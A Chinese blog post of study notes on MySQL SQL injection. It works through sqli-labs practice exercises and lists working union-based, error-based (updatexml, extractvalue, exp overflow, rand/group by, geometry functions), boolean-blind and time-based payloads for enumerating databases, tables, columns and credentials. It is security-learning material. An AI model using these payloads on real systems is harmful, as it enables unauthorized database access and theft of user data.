---
title: "MySQL 注入学习"
date: 2019-04-30T16:05:52+08:00
tags: ['MySQL','injection']
categories: ['渗透测试']
---

系统学习MySQL注入，记下笔记。

<!--more-->

## 科普函数

字符串相关

|     函数      |              用法               |
| :-----------: | :-----------------------------: |
|   left(a,b)   |       从左侧截取a的前b位        |
| substr(a,b,c) | 从b位置开始，截取字符串a的c长度 |
|  mid(a,b,c)   |            同substr             |
|    ascii()    |     将某个字符转换为ascii值     |
|     ord()     |             同ascii             |

数学相关

| 函数名 |                 用法                 |
| :----: | :----------------------------------: |
| exp(x) | 此函数返回e(自然对数的底)到X次方的值 |

懒，用到什么查什么吧。

## 符号

特殊符号
```mysql
''
""
()
{}
\
\\
``
%
```
注释符号
```mysql
# 
/**/   /*/**/这样是等效于/**/
-- + 用这个符号注意是--空格任意字符很多人搞混了
;%00
`
/*!*/  /*!/*!*/是等效于/*!*/的
```
操作符
```mysql
:=
||, OR, XOR
&&, AND
NOT
BETWEEN, CASE, WHEN, THEN, ELSE
=, <=>, >=, >, <=, <, <>, !=, IS, LIKE, REGEXP, IN
|
&
<<, >>
-, +
*, /, DIV, %, MOD
^
- (一元减号), ~ (一元比特反转)
!
BINARY, COLLATE
```
## MySQL类型转换
MySQL隐式类型转换
```mysql
1=1
1='1'
1="1"
1=true
1=1+'a'
1=1+"a"
1=0+true
```
0 false同理

## information_schema
information_schema这这个数据库中保存了MySQL服务器所有数据库的信息。
如数据库名，数据库的表，表栏的数据类型与访问权限等。

再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，
每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。



| 表名     | 列名         | 内容                     |
| -------- | ------------ | ------------------------ |
| schemata | schema_name  | 所有数据库的名字         |
| tables   | table_schema | 所有数据库的名字         |
| tables   | table_name   | 所有数据库的表的名字     |
| columns  | table_schema | 所有数据库的名字         |
| columns  | table_name   | 所有数据库的表的名字     |
| columns  | column_name  | 所有数据库的表的列的名字 |

由此我们可以查当前数据库的表名
```mysql
select table_name from information_schema.tables where table_schema=database() limit 0,1;
```
字段名
```mysql
select column_name from information_schema.columns where table_name='user' and table_schema=database() limit 0,1;
```
知道表名和字段名即可查出我们想要的数据。
```mysql
select 字段名 from 表名;
```
那么由此我们当我们遇到注入可以执行我们的sql语句时，将如上sql语句套进去即可。

---
## 注入的几大种类
此处注入的分类是根据服务器对我们传的参数不同的响应来进行划分。
### 联合查询注入
适用于有回显位的注入
```mysql
mysql> select * from user where id=1 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | admin    | admin    |
|  1 | 2        | 3        |
+----+----------+----------+
2 rows in set (0.00 sec)
```
`union select`
`union all select` 不去重
将1，2，3替换为sql语句即可。具体替换那一个需要看页面回显了哪一位。
### 报错注入
适用于有MySQL报错信息提示的注入。
#### BIGINT等数据类型溢出
按位取反`~`、`!`、`exp()`来溢出报错。

有版本限制，mysql>5.5.53时，则不能返回查询结果。

```mysql
select exp(~(select*from(select user())x));
```

```mysql
select (select(!x-~0)from(select(select user())x)a);
```

报错信息是有长度限制的，在`mysql/my_error.c`中可以看到

#### XPATH语法错误

从mysql5.1.5开始提供两个XML查询和修改的函数，`extractvalue`和`updatexml`。`extractvalue`负责在xml文档中按照xpath语法查询节点内容，`updatexml`则负责修改查询到的内容。

它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里。

```mysql
select updatexml(1,concat(0x7e,(select version()),0x7e),1);
```

```mysql
select extractvalue(1,concat(0x7e,(select version()),0x7e));
```

注意报错回显长度有限制，配合字符串操作函数使用。

#### concat()+rand()+group by导致主键重复

```mysql
select count(*) from users group by concat(version(),floor(rand(0)*2));
```

```mysql
http://172.16.0.1/Less-5/?id=1' and (select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2))) -- +
```

只要是count，rand()，group by三个连用就会造成这种报错，与位置无关。

#### 函数特性报错

- geometrycollection() 

```mysql
and geometrycollection((select * from(select * from(select user())a)b))-- + 
```
- multipoint()

```mysql
and multipoint((select * from(select * from(select user())a)b))-- +
```
- polygon() 

```mysql
and polygon((select * from(select * from(select user())a)b))-- +
```
- multipolygon() 

```mysql
and multipolygon((select * from(select * from(select user())a)b))-- +
```
- linestring() 

```mysql
and linestring((select * from(select * from(select user())a)b))-- +
```
- multilinestring() 

```mysql
and multilinestring((select * from(select * from(select user())a)b))-- +
```

### 盲注
盲注指的是没有回显，但是能根据我们构造的sql条件返回不同响应，而盲注跑出数据相对较麻烦
#### 布尔型的盲注
适用于对条件真假返回不同响应的注入
以sqlilabs第6关举例
```mysql
http://go.go/sqli-labs/Less-6/?id=1" SQL语句报错
http://go.go/sqli-labs/Less-6/?id=1" and 1=1 -- + 返回正常
http://go.go/sqli-labs/Less-6/?id=1" and 1=2 -- + 返回不正常
```
![](https://y4er.com/img/uploads/20190430180557.png)
当and条件1=1为真时，页面返回`You are in...........`
and条件1=2为假时
![](https://y4er.com/img/uploads/20190430180906.png)
`You are in...........`不显示，那么这就是一个布尔型的MySQL盲注。

获取数据库名长度
```mysql
http://go.go/sqli-labs/Less-6/?id=1" and length(database())=1 -- +
```
可以通过python脚本或者burp来跑

获取数据库名
```mysql
http://go.go/sqli-labs/Less-6/?id=1" and mid(database(),1,1)='s' -- +
```
可以通过字符串函数及其参数来更改payload拿到数据库名

获取表名
```mysql
http://go.go/sqli-labs/Less-6/?id=1" and mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e' -- +
```
修改limit和mid的参数即可拿到数据

获取字段名
```mysql
http://go.go/sqli-labs/Less-6/?id=1" and mid((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1)='i'-- +
```
获取数据
```mysql
http://go.go/sqli-labs/Less-6/?id=1" and mid((select username from user limit 0,1),1,5)='admin' -- +
```

ps:其实盲注用二分法比穷举快

#### 基于时间盲注
适用于对页面无变化，无法用布尔盲注判断的情况，一般用到函数 `sleep()` `BENCHMARK()`。

`sleep()`作用是用来延时
`benchmark()`其作用是来测试一些函数的执行速度。benchmark()中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式。

时间盲注我们还需要使用条件判断函数if()
`if（expre1，expre2，expre3）` 当expre1为true时，返回expre2，false时，返回expre3

我只举一下例子
```mysql
mysql> select * from users where id =1 and if((substr((select user()),1,1)='r'),sleep(5),1);
Empty set (5.01 sec)

mysql> select * from users where id =1 and if((substr((select user()),1,1)='r1'),sleep(5),1);
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)

mysql> select * from users where id =1 and if((substr((select user()),1,1)='r'),BENCHMARK(20000000,md5('a')),1);
Empty set (5.15 sec)
```

盲注中需要注意到的点：



1. 盲注中使用 and 你得确定你查询的值得存在 。
2. 在返回多组数据的情况下，你的延时不再是 单纯的 `sleep(5)` 他将根据你返回的数据条数来反复执行
3. 在如同搜索型时尽量搜索存在且数目较少的关键词
4. 尽量不要使用 or 

至于以上为什么会出现这种原因 [这篇文章讲的很清楚](https://www.t00ls.net/thread-45590-1-10.html)

## 后话
其实还有一些注入分类我没有写，比如二次注入，宽字节注入等，有时间再写吧。这篇文章写到这有很多收获了。下一篇准备开bypass的坑。

参考链接

1. [MySQL-盲注浅析](https://rcoil.me/2017/11/MySQL-%E7%9B%B2%E6%B3%A8%E6%B5%85%E6%9E%90/)
2. [404师傅 MYSQL_SQL_BYPASS](https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI)
3. [MYSQL报错注入的一点总结](https://xz.aliyun.com/t/253)